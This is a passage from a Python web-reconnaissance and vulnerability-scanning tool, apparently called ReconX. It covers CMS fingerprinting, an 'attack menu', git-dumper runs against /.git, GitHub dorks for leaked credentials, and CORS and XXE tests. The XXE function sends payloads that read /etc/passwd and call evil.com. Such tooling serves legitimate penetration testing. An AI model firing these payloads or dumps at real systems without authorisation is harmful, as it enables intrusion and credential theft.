        else:
            self.print_info("Installing JoomScan...")
            if self.run_command("git clone https://github.com/OWASP/joomscan.git tools/joomscan"):
                self.run_joomla_scans()
        
        # Manual Joomla detection
        self.joomla_manual_detection()
    
    def run_drupal_scans(self):
        """Run Drupal-specific scans"""
        self.print_info("Running Drupal-specific scans...")
        
        Path(f"{self.scan_dir}/cms/drupal").mkdir(parents=True, exist_ok=True)
        
        # Skip Droopescan due to Python 3.12 compatibility issues
        self.print_warning("Droopescan skipped due to Python 3.12 compatibility issues")
        self.print_info("Using manual Drupal detection methods instead...")
        
        # Enhanced manual Drupal detection
        self.drupal_manual_detection()
        self.drupal_version_detection()
        self.drupal_vulnerability_check()
    
    def wordpress_manual_detection(self):
        """Manual WordPress detection methods"""
        self.print_info("Performing manual WordPress detection...")
        
        wp_detection = f"{self.scan_dir}/cms/wordpress/manual_detection.txt"
        
        detection_urls = [
            f"https://{self.domain}/wp-admin/",
            f"https://{self.domain}/wp-login.php",
            f"https://{self.domain}/wp-content/",
            f"https://{self.domain}/wp-includes/",
            f"https://{self.domain}/xmlrpc.php",
            f"https://{self.domain}/wp-json/wp/v2/users",
            f"https://{self.domain}/readme.html",
            f"https://{self.domain}/license.txt"
        ]
        
        results = []
        for url in detection_urls:
            try:
                response = requests.get(url, timeout=10, verify=False)
                results.append(f"{url} - Status: {response.status_code}")
                if response.status_code == 200:
                    results.append(f"  Content-Length: {len(response.content)}")
                    if 'wp-' in response.text.lower() or 'wordpress' in response.text.lower():
                        results.append(f"  WordPress indicators found!")
            except:
                results.append(f"{url} - Connection failed")
        
        with open(wp_detection, 'w') as f:
            f.write("WordPress Manual Detection Results\n")
            f.write("=" * 40 + "\n")
            f.write("\n".join(results))
    
    def joomla_manual_detection(self):
        """Manual Joomla detection methods"""
        self.print_info("Performing manual Joomla detection...")
        
        joomla_detection = f"{self.scan_dir}/cms/joomla/manual_detection.txt"
        
        detection_urls = [
            f"https://{self.domain}/administrator/",
            f"https://{self.domain}/administrator/index.php",
            f"https://{self.domain}/components/",
            f"https://{self.domain}/modules/",
            f"https://{self.domain}/templates/",
            f"https://{self.domain}/cache/",
            f"https://{self.domain}/language/en-GB/en-GB.xml",
            f"https://{self.domain}/joomla.xml",
            f"https://{self.domain}/htaccess.txt"
        ]
        
        results = []
        for url in detection_urls:
            try:
                response = requests.get(url, timeout=10, verify=False)
                results.append(f"{url} - Status: {response.status_code}")
                if response.status_code == 200:
                    if 'joomla' in response.text.lower():
                        results.append(f"  Joomla indicators found!")
            except:
                results.append(f"{url} - Connection failed")
        
        with open(joomla_detection, 'w') as f:
            f.write("Joomla Manual Detection Results\n")
            f.write("=" * 40 + "\n")
            f.write("\n".join(results))
    
    def drupal_manual_detection(self):
        """Manual Drupal detection methods"""
        self.print_info("Performing manual Drupal detection...")
        
        drupal_detection = f"{self.scan_dir}/cms/drupal/manual_detection.txt"
        
        detection_urls = [
            f"https://{self.domain}/user/login",
            f"https://{self.domain}/admin/",
            f"https://{self.domain}/sites/default/",
            f"https://{self.domain}/misc/",
            f"https://{self.domain}/modules/",
            f"https://{self.domain}/themes/",
            f"https://{self.domain}/includes/",
            f"https://{self.domain}/CHANGELOG.txt",
            f"https://{self.domain}/COPYRIGHT.txt",
            f"https://{self.domain}/INSTALL.txt"
        ]
        
        results = []
        for url in detection_urls:
            try:
                response = requests.get(url, timeout=10, verify=False)
                results.append(f"{url} - Status: {response.status_code}")
                if response.status_code == 200:
                    if 'drupal' in response.text.lower():
                        results.append(f"  Drupal indicators found!")
            except:
                results.append(f"{url} - Connection failed")
        
        with open(drupal_detection, 'w') as f:
            f.write("Drupal Manual Detection Results\n")
            f.write("=" * 40 + "\n")
            f.write("\n".join(results))
    
    def drupal_version_detection(self):
        """Detect Drupal version"""
        self.print_info("Detecting Drupal version...")
        
        version_file = f"{self.scan_dir}/cms/drupal/version_detection.txt"
        version_info = []
        
        try:
            # Check CHANGELOG.txt for version info
            changelog_url = f"https://{self.domain}/CHANGELOG.txt"
            response = requests.get(changelog_url, timeout=10, verify=False)
            if response.status_code == 200:
                lines = response.text.split('\n')[:10]  # First 10 lines usually contain version
                for line in lines:
                    if 'drupal' in line.lower() or any(char.isdigit() for char in line):
                        version_info.append(f"CHANGELOG: {line.strip()}")
            
            # Check generator meta tag
            main_response = requests.get(f"https://{self.domain}", timeout=10, verify=False)
            if 'generator' in main_response.text.lower() and 'drupal' in main_response.text.lower():
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(main_response.text, 'html.parser')
                generator = soup.find('meta', attrs={'name': 'generator'})
                if generator and generator.get('content'):
                    version_info.append(f"Generator: {generator.get('content')}")
            
            # Check for Drupal-specific JavaScript files
            js_patterns = [
                '/misc/drupal.js',
                '/core/misc/drupal.js',
                '/sites/all/themes/'
            ]
            
            for pattern in js_patterns:
                js_url = f"https://{self.domain}{pattern}"
                try:
                    js_response = requests.head(js_url, timeout=5, verify=False)
                    if js_response.status_code == 200:
                        version_info.append(f"JS File found: {pattern}")
                except:
                    continue
            
        except Exception as e:
            version_info.append(f"Error in version detection: {e}")
        
        with open(version_file, 'w') as f:
            f.write("Drupal Version Detection Results\n")
            f.write("=" * 40 + "\n")
            f.write("\n".join(version_info))
    
    def drupal_vulnerability_check(self):
        """Check for common Drupal vulnerabilities"""
        self.print_info("Checking for common Drupal vulnerabilities...")
        
        vuln_file = f"{self.scan_dir}/cms/drupal/vulnerability_check.txt"
        vuln_results = []
        
        # Common Drupal vulnerability paths
        vuln_paths = [
            '/xmlrpc.php',
            '/install.php',
            '/update.php',
            '/cron.php',
            '/authorize.php',
            '/sites/default/settings.php',
            '/sites/default/files/',
            '/.htaccess',
            '/robots.txt'
        ]
        
        for path in vuln_paths:
            try:
                vuln_url = f"https://{self.domain}{path}"
                response = requests.get(vuln_url, timeout=10, verify=False)
                vuln_results.append(f"{path} - Status: {response.status_code}")
                
                if response.status_code == 200:
                    if path == '/install.php' and 'install drupal' in response.text.lower():
                        vuln_results.append(f"  ⚠️  VULNERABILITY: Installation page accessible!")
                    elif path == '/update.php' and 'update' in response.text.lower():
                        vuln_results.append(f"  ⚠️  VULNERABILITY: Update page accessible!")
                    elif path == '/sites/default/settings.php':
                        vuln_results.append(f"  ⚠️  VULNERABILITY: Settings file accessible!")
                        
            except:
                vuln_results.append(f"{path} - Connection failed")
        
        with open(vuln_file, 'w') as f:
            f.write("Drupal Vulnerability Check Results\n")
            f.write("=" * 40 + "\n")
            f.write("\n".join(vuln_results))
    
    def run_custom_cms_fingerprinting(self):
        """Run custom CMS fingerprinting techniques"""
        self.print_info("Running custom CMS fingerprinting...")
        
        fingerprint_results = f"{self.scan_dir}/cms/custom_fingerprinting.json"
        
        fingerprints = {
            "target": self.domain,
            "scan_time": datetime.now().isoformat(),
            "technologies": {},
            "indicators": {},
            "headers": {},
            "meta_tags": {},
            "cookies": {}
        }
        
        try:
            # Analyze main page
            response = requests.get(f"https://{self.domain}", timeout=15, verify=False, 
                                  headers={'User-Agent': 'Mozilla/5.0 (compatible; ReconX)'})
            
            # Extract headers
            fingerprints["headers"] = dict(response.headers)
            
            # Extract cookies
            fingerprints["cookies"] = {cookie.name: cookie.value for cookie in response.cookies}
            
            # Parse HTML for indicators
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Meta tags analysis
            meta_tags = soup.find_all('meta')
            fingerprints["meta_tags"] = {
                tag.get('name', tag.get('property', 'unknown')): tag.get('content', '') 
                for tag in meta_tags if tag.get('content')
            }
            
            # Technology indicators in HTML
            html_content = response.text.lower()
            
            cms_indicators = {
                'wordpress': ['wp-content', 'wp-includes', 'wp-admin', '/wp-json/', 'wordpress'],
                'joomla': ['joomla', 'com_content', 'mod_', 'plg_', '/administrator/'],
                'drupal': ['drupal', 'sites/default', '/misc/', '/modules/', 'drupal.settings'],
                'magento': ['magento', 'mage/', 'skin/frontend', 'varien/', 'prototype.js'],
                'prestashop': ['prestashop', '/themes/', '/modules/', 'prestashop.com'],
                'opencart': ['opencart', 'catalog/', 'system/', 'vqmod/'],
                'typo3': ['typo3', 'typo3conf/', 'fileadmin/', 'typo3temp/'],
                'concrete5': ['concrete5', 'concrete/', 'ccm_', 'c5_'],
                'umbraco': ['umbraco', '/umbraco/', 'umbraco.clientdependency'],
                'sharepoint': ['sharepoint', '_layouts/', 'webresource.axd', 'scriptresource.axd'],
                'moodle': ['moodle', 'course/view.php', 'login/index.php', 'mod/'],
                'mediawiki': ['mediawiki', 'index.php?title=', 'special:search', 'wiki/'],
                'phpbb': ['phpbb', 'phpbb/', 'viewforum.php', 'viewtopic.php'],
                'vbulletin': ['vbulletin', 'forumdisplay.php', 'showthread.php', 'clientscript/']
            }
            
            for cms, indicators in cms_indicators.items():
                score = sum(1 for indicator in indicators if indicator in html_content)
                if score > 0:
                    fingerprints["technologies"][cms] = {
                        "confidence": min(score * 20, 100),
                        "indicators_found": score,
                        "total_indicators": len(indicators)
                    }
            
            # JavaScript framework detection
            js_frameworks = {
                'jquery': ['jquery', '$(', 'jQuery'],
                'react': ['react', 'reactjs', '_react'],
                'angular': ['angular', 'ng-', 'angularjs'],
                'vue': ['vue.js', 'vue-', 'vuejs'],
                'bootstrap': ['bootstrap', 'bs-', 'bootstrap.'],
                'foundation': ['foundation', 'zurb'],
                'backbone': ['backbone', 'backbone.js'],
                'ember': ['ember', 'emberjs']
            }
            
            for framework, indicators in js_frameworks.items():
                score = sum(1 for indicator in indicators if indicator in html_content)
                if score > 0:
                    fingerprints["technologies"][f"js_{framework}"] = {
                        "confidence": min(score * 25, 100),
                        "type": "javascript_framework"
                    }
            
        except Exception as e:
            self.print_error(f"Error in custom fingerprinting: {e}")
            fingerprints["error"] = str(e)
        
        # Save results
        with open(fingerprint_results, 'w') as f:
            json.dump(fingerprints, f, indent=2)
        
        self.print_success(f"Custom fingerprinting completed: {fingerprint_results}")
    
    def generate_cms_report(self):
        """Generate a consolidated CMS report"""
        self.print_info("Generating consolidated CMS report...")
        
        report_file = f"{self.scan_dir}/cms/cms_consolidated_report.html"
        
        html_report = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>CMS Enumeration Report - {self.domain}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
                .header {{ background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
                .section {{ background-color: white; margin: 20px 0; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
                .high {{ background-color: #e74c3c; color: white; padding: 10px; border-radius: 3px; margin: 5px 0; }}
                .medium {{ background-color: #f39c12; color: white; padding: 10px; border-radius: 3px; margin: 5px 0; }}
                .low {{ background-color: #27ae60; color: white; padding: 10px; border-radius: 3px; margin: 5px 0; }}
                .info {{ background-color: #3498db; color: white; padding: 10px; border-radius: 3px; margin: 5px 0; }}
                table {{ width: 100%; border-collapse: collapse; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                pre {{ background-color: #f8f9fa; padding: 15px; border-radius: 3px; overflow-x: auto; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>CMS Enumeration Report</h1>
                <p><strong>Target:</strong> {self.domain}</p>
                <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
        """
        
        # Add sections for each scan result
        cms_files = [
            ('CMSeeK Results', f'{self.scan_dir}/cms/cmseek_{self.domain}.txt'),
            ('WhatWeb Results', f'{self.scan_dir}/cms/whatweb_{self.domain}.txt'),
            ('WordPress Scan', f'{self.scan_dir}/cms/wordpress/wpscan_{self.domain}.txt'),
            ('Joomla Scan', f'{self.scan_dir}/cms/joomla/joomscan_{self.domain}.txt'),
            ('Drupal Scan', f'{self.scan_dir}/cms/drupal/droopescan_{self.domain}.txt'),
            ('Custom Fingerprinting', f'{self.scan_dir}/cms/custom_fingerprinting.json')
        ]
        
        for section_name, file_path in cms_files:
            html_report += f'<div class="section"><h2>{section_name}</h2>'
            
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'r') as f:
                        content = f.read()
                        if file_path.endswith('.json'):
                            # Pretty print JSON
                            try:
                                import json as json_mod
                                parsed = json_mod.loads(content)
                                content = json_mod.dumps(parsed, indent=2)
                            except:
                                pass
                        
                        html_report += f'<pre>{content[:2000]}{"..." if len(content) > 2000 else ""}</pre>'
                except:
                    html_report += '<p>Could not read file content</p>'
            else:
                html_report += '<p>No results found for this scan</p>'
            
            html_report += '</div>'
        
        html_report += '</body></html>'
        
        with open(report_file, 'w') as f:
            f.write(html_report)
        
        self.print_success(f"Consolidated CMS report generated: {report_file}")
    
    def parse_cmseek_output(self, output):
        """Parse CMSeeK text output and extract CMS information"""
        cms_data = {
            "target": self.target,
            "domain": self.domain,
            "cms_detected": False,
            "cms_name": None,
            "cms_version": None,
            "detection_method": None,
            "scan_time": None,
            "requests_made": None
        }
        
        try:
            lines = output.split('\n')
            for line in lines:
                # Extract CMS detection info
                if "CMS Detected, CMS ID:" in line:
                    cms_data["cms_detected"] = True
                    # Extract CMS ID
                    if "CMS ID:" in line and "Detection method:" in line:
                        parts = line.split("CMS ID:")
                        if len(parts) > 1:
                            cms_part = parts[1].split(",")[0].strip()
                            cms_data["cms_name"] = cms_part
                        
                        # Extract detection method
                        if "Detection method:" in line:
                            method_parts = line.split("Detection method:")
                            if len(method_parts) > 1:
                                cms_data["detection_method"] = method_parts[1].strip()
                
                # Extract CMS name from results section
                elif "CMS:" in line and "Moodle" in line:
                    cms_data["cms_name"] = "Moodle"
                
                # Extract scan time
                elif "Scan Completed in" in line:
                    import re
                    time_match = re.search(r'(\d+\.?\d*)\s*Seconds', line)
                    requests_match = re.search(r'using\s+(\d+)\s+Requests', line)
                    if time_match:
                        cms_data["scan_time"] = float(time_match.group(1))
                    if requests_match:
                        cms_data["requests_made"] = int(requests_match.group(1))
            
            return cms_data
            
        except Exception as e:
            self.print_error(f"Error parsing CMSeeK output: {e}")
            return cms_data
    
    def waf_detection(self):
        """Detect WAF"""
        self.print_info("Starting WAF detection...")
        
        if self.check_tool_installed('wafw00f'):
            waf_output = f"{self.scan_dir}/waf/wafw00f_{self.domain}.txt"
            self.run_command(f"wafw00f https://{self.domain} > {waf_output}")
        
        self.print_success("WAF detection completed")
    
    def information_disclosure(self):
        """Check for information disclosure"""
        self.print_info("Checking for information disclosure...")
        
        # Git dumper
        if os.path.exists("tools/git-dumper/git-dumper.py"):
            git_output = f"{self.scan_dir}/git/git-dump_{self.domain}"
            self.run_command(f"python3 tools/git-dumper/git-dumper.py https://{self.domain}/.git {git_output}")
        
        self.print_success("Information disclosure check completed")
    
    def show_menu(self):
        """Show attack menu"""
        menu = f"""
{Colors.CYAN}{Colors.BOLD}Select Attack Types:{Colors.END}
{Colors.GREEN}1.{Colors.END}  Subdomain Enumeration
{Colors.GREEN}2.{Colors.END}  Port Scanning
{Colors.GREEN}3.{Colors.END}  Screenshots
{Colors.GREEN}4.{Colors.END}  Directory Bruteforce
{Colors.GREEN}5.{Colors.END}  JavaScript Analysis
{Colors.GREEN}6.{Colors.END}  Parameter Discovery
{Colors.GREEN}7.{Colors.END}  XSS Testing
{Colors.GREEN}8.{Colors.END}  SQL Injection Testing
{Colors.GREEN}9.{Colors.END}  SSRF/RCE Testing
{Colors.GREEN}10.{Colors.END} LFI/RFI Testing
{Colors.GREEN}11.{Colors.END} Open Redirect Testing
{Colors.GREEN}12.{Colors.END} Security Headers Check
{Colors.GREEN}13.{Colors.END} API Reconnaissance
{Colors.GREEN}14.{Colors.END} S3 Bucket Enumeration
{Colors.GREEN}15.{Colors.END} CMS Enumeration
{Colors.GREEN}16.{Colors.END} WAF Detection
{Colors.GREEN}17.{Colors.END} Information Disclosure
{Colors.GREEN}18.{Colors.END} CSRF Testing
{Colors.GREEN}19.{Colors.END} JWT Token Testing
{Colors.GREEN}20.{Colors.END} Subdomain Takeover
{Colors.GREEN}21.{Colors.END} GitHub Dorking
{Colors.GREEN}22.{Colors.END} SSL/TLS Analysis
{Colors.GREEN}23.{Colors.END} CORS Misconfiguration
{Colors.GREEN}24.{Colors.END} XXE Testing
{Colors.GREEN}25.{Colors.END} SSTI Testing
{Colors.GREEN}26.{Colors.END} NoSQL Injection
{Colors.GREEN}27.{Colors.END} File Upload Vulnerabilities
{Colors.GREEN}28.{Colors.END} Authentication Bypass
{Colors.GREEN}29.{Colors.END} Cloud Storage Enumeration
{Colors.GREEN}30.{Colors.END} WebSocket Testing
{Colors.GREEN}31.{Colors.END} Deserialization Testing
{Colors.GREEN}32.{Colors.END} Race Condition Testing
{Colors.GREEN}33.{Colors.END} Business Logic Testing
{Colors.GREEN}34.{Colors.END} Nuclei Template Execution
{Colors.GREEN}35.{Colors.END} Full Scan (All tests)
{Colors.GREEN}0.{Colors.END}  Exit

{Colors.YELLOW}Enter your choices (comma-separated, e.g., 1,2,3): {Colors.END}"""
        
        print(menu)
        return input().strip()
    
    def run_selected_scans(self, choices):
        """Run selected scans"""
        scan_functions = {
            1: self.subdomain_enumeration,
            2: self.port_scanning,
            3: self.take_screenshots,
            4: self.directory_bruteforce,
            5: self.javascript_analysis,
            6: self.parameter_discovery,
            7: self.xss_testing,
            8: self.sql_injection_testing,
            9: self.ssrf_rce_testing,
            10: self.lfi_rfi_testing,
            11: self.open_redirect_testing,
            12: self.security_headers_check,
            13: self.api_reconnaissance,
            14: self.s3_bucket_enumeration,
            15: self.cms_enumeration,
            16: self.waf_detection,
            17: self.information_disclosure,
            18: self.csrf_testing,
            19: self.jwt_token_testing,
            20: self.subdomain_takeover,
            21: self.github_dorking,
            22: self.ssl_tls_analysis,
            23: self.cors_misconfiguration,
            24: self.xxe_testing,
            25: self.ssti_testing,
            26: self.nosql_injection_testing,
            27: self.file_upload_vulnerabilities,
            28: self.authentication_bypass,
            29: self.cloud_storage_enumeration,
            30: self.websocket_testing,
            31: self.deserialization_testing,
            32: self.race_condition_testing,
            33: self.business_logic_testing,
            34: self.nuclei_template_execution,
            35: self.full_scan
        }
        
        try:
            if '35' in choices:
                self.full_scan()
            else:
                selected = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit()]
                for choice in selected:
                    if choice in scan_functions:
                        scan_functions[choice]()
                    elif choice == 0:
                        sys.exit(0)
                    else:
                        self.print_warning(f"Invalid choice: {choice}")
        except ValueError:
            self.print_error("Invalid input. Please enter numbers separated by commas.")
    
    def full_scan(self):
        """Run full reconnaissance scan"""
        self.print_info("Starting comprehensive reconnaissance scan...")
        
        # Run all scans in order
        scans = [
            ("Subdomain Enumeration", self.subdomain_enumeration),
            ("Port Scanning", self.port_scanning),
            ("Screenshots", self.take_screenshots),
            ("Directory Bruteforce", self.directory_bruteforce),
            ("JavaScript Analysis", self.javascript_analysis),
            ("Parameter Discovery", self.parameter_discovery),
            ("XSS Testing", self.xss_testing),
            ("SQL Injection Testing", self.sql_injection_testing),
            ("SSRF/RCE Testing", self.ssrf_rce_testing),
            ("LFI/RFI Testing", self.lfi_rfi_testing),
            ("Open Redirect Testing", self.open_redirect_testing),
            ("Security Headers Check", self.security_headers_check),
            ("API Reconnaissance", self.api_reconnaissance),
            ("S3 Bucket Enumeration", self.s3_bucket_enumeration),
            ("CMS Enumeration", self.cms_enumeration),
            ("WAF Detection", self.waf_detection),
            ("Information Disclosure", self.information_disclosure),
            ("CSRF Testing", self.csrf_testing),
            ("JWT Token Testing", self.jwt_token_testing),
            ("Subdomain Takeover", self.subdomain_takeover),
            ("GitHub Dorking", self.github_dorking),
            ("SSL/TLS Analysis", self.ssl_tls_analysis),
            ("CORS Misconfiguration", self.cors_misconfiguration),
            ("XXE Testing", self.xxe_testing),
            ("SSTI Testing", self.ssti_testing),
            ("NoSQL Injection", self.nosql_injection_testing),
            ("File Upload Vulnerabilities", self.file_upload_vulnerabilities),
            ("Authentication Bypass", self.authentication_bypass),
            ("Cloud Storage Enumeration", self.cloud_storage_enumeration),
            ("WebSocket Testing", self.websocket_testing),
            ("Deserialization Testing", self.deserialization_testing),
            ("Race Condition Testing", self.race_condition_testing),
            ("Business Logic Testing", self.business_logic_testing),
            ("Nuclei Template Execution", self.nuclei_template_execution)
        ]
        
        for scan_name, scan_func in scans:
            self.print_info(f"Running {scan_name}...")
            try:
                scan_func()
            except Exception as e:
                self.print_error(f"Error in {scan_name}: {e}")
            time.sleep(1)  # Brief pause between scans
        
        self.print_success("Comprehensive reconnaissance scan completed!")
        self.print_info(f"Results saved in: {self.scan_dir}")

    # ============================================================================
    # NEW ADVANCED ATTACK METHODS 
    # ============================================================================

    def csrf_testing(self):
        """Test for CSRF vulnerabilities"""
        self.print_info("Starting CSRF vulnerability testing...")
        
        csrf_output = f"{self.scan_dir}/vulnerabilities/csrf_{self.domain}.txt"
        
        # Basic CSRF token analysis
        try:
            import requests
            response = requests.get(f"https://{self.domain}", verify=False, timeout=10)
            
            csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token']
            csrf_found = []
            
            for indicator in csrf_indicators:
                if indicator in response.text.lower():
                    csrf_found.append(indicator)
            
            with open(csrf_output, 'w') as f:
                if csrf_found:
                    f.write(f"CSRF tokens found: {', '.join(csrf_found)}\n")
                    f.write("Manual testing recommended for CSRF bypass\n")
                else:
                    f.write("No obvious CSRF protection found - potential vulnerability\n")
                    
        except Exception as e:
            self.print_error(f"CSRF testing failed: {e}")
        
        self.print_success("CSRF testing completed")

    def jwt_token_testing(self):
        """Analyze JWT tokens for vulnerabilities"""
        self.print_info("Starting JWT token analysis...")
        
        jwt_output = f"{self.scan_dir}/vulnerabilities/jwt_{self.domain}.txt"
        
        try:
            import requests
            import json
            import base64
            
            response = requests.get(f"https://{self.domain}", verify=False, timeout=10)
            
            # Look for JWT patterns
            jwt_patterns = ['eyJ', 'Bearer ', 'Authorization:']
            potential_jwts = []
            
            for pattern in jwt_patterns:
                if pattern in response.text:
                    potential_jwts.append(pattern)
            
            with open(jwt_output, 'w') as f:
                if potential_jwts:
                    f.write(f"Potential JWT indicators found: {', '.join(potential_jwts)}\n")
                    f.write("Recommendations:\n")
                    f.write("- Test for algorithm confusion (HS256 vs RS256)\n")
                    f.write("- Check for weak signing keys\n")
                    f.write("- Verify token expiration\n")
                else:
                    f.write("No JWT indicators found\n")
                    
        except Exception as e:
            self.print_error(f"JWT analysis failed: {e}")
        
        self.print_success("JWT token analysis completed")

    def subdomain_takeover(self):
        """Check for subdomain takeover vulnerabilities"""
        self.print_info("Starting subdomain takeover detection...")
        
        takeover_output = f"{self.scan_dir}/vulnerabilities/subdomain_takeover_{self.domain}.txt"
        
        # First ensure we have subdomains
        subdomains_file = f"{self.scan_dir}/subdomains/subdomains.txt"
        if not os.path.exists(subdomains_file):
            self.subdomain_enumeration()
        
        if self.check_tool_installed('subjack'):
            self.run_command(f"subjack -w {subdomains_file} -o {takeover_output}")
        else:
            # Manual subdomain takeover detection
            try:
                import requests
                import dns.resolver
                
                takeover_indicators = {
                    'github.io': 'There isn\'t a GitHub Pages site here',
                    'herokuapp.com': 'No such app',
                    'amazonaws.com': 'NoSuchBucket',
                    'azurewebsites.net': 'Error 404',
                    'cloudfront.net': 'Bad Request'
                }
                
                with open(takeover_output, 'w') as f:
                    f.write("Subdomain Takeover Analysis\n")
                    f.write("=" * 40 + "\n\n")
                    
                    if os.path.exists(subdomains_file):
                        with open(subdomains_file, 'r') as sub_file:
                            for subdomain in sub_file:
                                subdomain = subdomain.strip()
                                if subdomain:
                                    try:
                                        response = requests.get(f"https://{subdomain}", timeout=5, verify=False)
                                        for service, indicator in takeover_indicators.items():
                                            if service in subdomain and indicator in response.text:
                                                f.write(f"POTENTIAL TAKEOVER: {subdomain} -> {service}\n")
                                    except:
                                        pass
                    else:
                        f.write("No subdomains file found\n")
                        
            except Exception as e:
                self.print_error(f"Subdomain takeover detection failed: {e}")
        
        self.print_success("Subdomain takeover detection completed")

    def github_dorking(self):
        """Perform GitHub dorking for sensitive information"""
        self.print_info("Starting GitHub reconnaissance...")
        
        github_output = f"{self.scan_dir}/osint/github_{self.domain}.txt"
        
        try:
            # GitHub search queries
            search_queries = [
                f'"{self.domain}" password',
                f'"{self.domain}" api_key',
                f'"{self.domain}" secret',
                f'"{self.domain}" config',
                f'"{self.domain}" database',
                f'"{self.domain}" credentials',
                f'"{self.domain}" token',
                f'site:{self.domain} filename:config'
            ]
            
            with open(github_output, 'w') as f:
                f.write("GitHub Dorking Queries\n")
                f.write("=" * 40 + "\n\n")
                
                for query in search_queries:
                    f.write(f"Search: {query}\n")
                    f.write(f"URL: https://github.com/search?q={query.replace(' ', '%20')}\n\n")
                
                f.write("Manual Review Required:\n")
                f.write("- Check repositories for leaked credentials\n")
                f.write("- Review configuration files\n")
                f.write("- Look for hardcoded secrets\n")
                
        except Exception as e:
            self.print_error(f"GitHub dorking failed: {e}")
        
        self.print_success("GitHub reconnaissance completed")

    def ssl_tls_analysis(self):
        """Enhanced SSL/TLS security analysis"""
        self.print_info("Starting enhanced SSL/TLS analysis...")
        
        ssl_output = f"{self.scan_dir}/ssl/ssl_analysis_{self.domain}.txt"
        Path(f"{self.scan_dir}/ssl").mkdir(parents=True, exist_ok=True)
        
        # SSLyze analysis
        if self.check_tool_installed('sslyze'):
            self.run_command(f"sslyze --regular {self.domain} > {ssl_output}")
        
        # testssl.sh analysis
        if os.path.exists("/opt/testssl.sh/testssl.sh"):
            testssl_output = f"{self.scan_dir}/ssl/testssl_{self.domain}.txt"
            self.run_command(f"/opt/testssl.sh/testssl.sh --fast {self.domain} > {testssl_output}")
        
        # Manual SSL analysis
        try:
            import ssl
            import socket
            
            manual_output = f"{self.scan_dir}/ssl/manual_ssl_{self.domain}.txt"
            
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    with open(manual_output, 'w') as f:
                        f.write("SSL Certificate Analysis\n")
                        f.write("=" * 40 + "\n\n")
                        f.write(f"Subject: {dict(x[0] for x in cert['subject'])}\n")
                        f.write(f"Issuer: {dict(x[0] for x in cert['issuer'])}\n")
                        f.write(f"Version: {cert['version']}\n")
                        f.write(f"Serial Number: {cert['serialNumber']}\n")
                        f.write(f"Not Before: {cert['notBefore']}\n")
                        f.write(f"Not After: {cert['notAfter']}\n")
                        
                        if 'subjectAltName' in cert:
                            f.write(f"Subject Alt Names: {cert['subjectAltName']}\n")
                            
        except Exception as e:
            self.print_error(f"Manual SSL analysis failed: {e}")
        
        self.print_success("SSL/TLS analysis completed")

    def cors_misconfiguration(self):
        """Test for CORS misconfigurations"""
        self.print_info("Starting CORS misconfiguration testing...")
        
        cors_output = f"{self.scan_dir}/vulnerabilities/cors_{self.domain}.txt"
        
        try:
            import requests
            
            test_origins = [
                'https://evil.com',
                'http://evil.com',
                f'https://evil.{self.domain}',
                'null',
                'https://localhost',
                '*'
            ]
            
            with open(cors_output, 'w') as f:
                f.write("CORS Misconfiguration Analysis\n")
                f.write("=" * 40 + "\n\n")
                
                for origin in test_origins:
                    try:
                        headers = {'Origin': origin}
                        response = requests.get(f"https://{self.domain}", headers=headers, timeout=10, verify=False)
                        
                        if 'Access-Control-Allow-Origin' in response.headers:
                            allowed_origin = response.headers['Access-Control-Allow-Origin']
                            if allowed_origin == origin or allowed_origin == '*':
                                f.write(f"POTENTIAL VULNERABILITY: Origin {origin} allowed\n")
                                f.write(f"Response: {allowed_origin}\n\n")
                        
                    except Exception as e:
                        f.write(f"Error testing origin {origin}: {e}\n")
                
                f.write("Recommendations:\n")
                f.write("- Implement strict origin validation\n")
                f.write("- Avoid using wildcard (*) for credentials\n")
                f.write("- Use whitelist of trusted domains\n")
                
        except Exception as e:
            self.print_error(f"CORS testing failed: {e}")
        
        self.print_success("CORS misconfiguration testing completed")

    def xxe_testing(self):
        """Test for XXE (XML External Entity) vulnerabilities"""
        self.print_info("Starting XXE vulnerability testing...")
        
        xxe_output = f"{self.scan_dir}/vulnerabilities/xxe_{self.domain}.txt"
        
        # XXE payloads
        xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/">]><test>&xxe;</test>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
        ]
        
        try:
            import requests
            
            with open(xxe_output, 'w') as f:
                f.write("XXE Vulnerability Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Test common XML endpoints
                endpoints = ['/', '/api', '/xml', '/soap']
                
                for endpoint in endpoints:
                    f.write(f"Testing endpoint: {endpoint}\n")
                    
                    for i, payload in enumerate(xxe_payloads):
                        try:
                            headers = {'Content-Type': 'application/xml'}
                            response = requests.post(f"https://{self.domain}{endpoint}", 
                                                   data=payload, headers=headers, timeout=10, verify=False)
                            
                            if 'root:' in response.text or 'passwd' in response.text:
                                f.write(f"POTENTIAL XXE VULNERABILITY with payload {i+1}\n")
                                f.write(f"Response length: {len(response.text)}\n\n")
                        except Exception as e:
                            f.write(f"Payload {i+1} error: {e}\n")
                    
                    f.write("\n")
                
                f.write("Manual testing recommendations:\n")
                f.write("- Test file upload endpoints with XML files\n")
                f.write("- Check SOAP/XML-RPC services\n")
                f.write("- Test API endpoints accepting XML\n")
                
        except Exception as e:
            self.print_error(f"XXE testing failed: {e}")
        
        self.print_success("XXE testing completed")

    def ssti_testing(self):
        """Test for Server-Side Template Injection"""
        self.print_info("Starting SSTI vulnerability testing...")
        
